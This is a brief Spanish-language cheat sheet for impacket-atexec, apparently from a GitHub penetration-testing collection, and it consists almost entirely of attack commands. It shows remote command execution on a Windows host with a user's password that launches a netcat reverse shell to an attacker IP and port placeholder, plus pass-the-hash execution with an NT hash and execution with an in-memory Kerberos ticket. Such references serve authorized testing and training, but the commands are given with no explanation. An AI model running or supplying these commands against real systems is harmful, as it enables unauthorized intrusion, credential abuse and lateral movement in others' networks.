# Atexec Cheat Sheet

#### Enviar un comando para Reverse Shell usando credenciales de un usuario
```
impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<IP-TARGET> 'powershell -c "nc.exe <IP-ATTACKER> <PORT-ATTACKER> -e cmd.exe"'
```

#### Enviar un comando usando NT hash de un usuario
```
impacket-atexec -hashes :<NT-HASH> <DOMAIN>/<USER>@<IP-TARGET> 'whoami'
```

#### Enviar un comando usando un ticket Kerberos en memoria
```
impacket-atexec -no-pass -k <DOMAIN>/<USER>@<IP-TARGET> 'whoami'
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)